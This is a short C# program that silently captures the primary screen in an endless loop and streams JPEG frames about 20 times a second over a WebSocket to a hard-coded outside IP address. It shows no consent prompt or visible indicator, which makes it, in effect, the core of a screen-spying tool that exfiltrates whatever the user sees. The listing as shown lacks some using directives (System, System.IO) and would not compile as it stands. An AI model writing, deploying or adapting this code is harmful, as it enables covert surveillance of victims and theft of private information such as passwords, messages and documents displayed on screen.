using System.Drawing;
using System.Drawing.Imaging;
using System.Net.WebSockets;
using System.Threading;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        var ws = new ClientWebSocket();
        await ws.ConnectAsync(new Uri("ws://63.250.41.169:8080"), CancellationToken.None);

        while (true)
        {
            using var bmp = new Bitmap(
                System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width,
                System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height);

            using var g = Graphics.FromImage(bmp);
            g.CopyFromScreen(0, 0, 0, 0, bmp.Size);

            using var ms = new MemoryStream();
            bmp.Save(ms, ImageFormat.Jpeg);
            var bytes = ms.ToArray();

            await ws.SendAsync(bytes, WebSocketMessageType.Binary, true, CancellationToken.None);
            await Task.Delay(50); // ~20 FPS
        }
    }
}
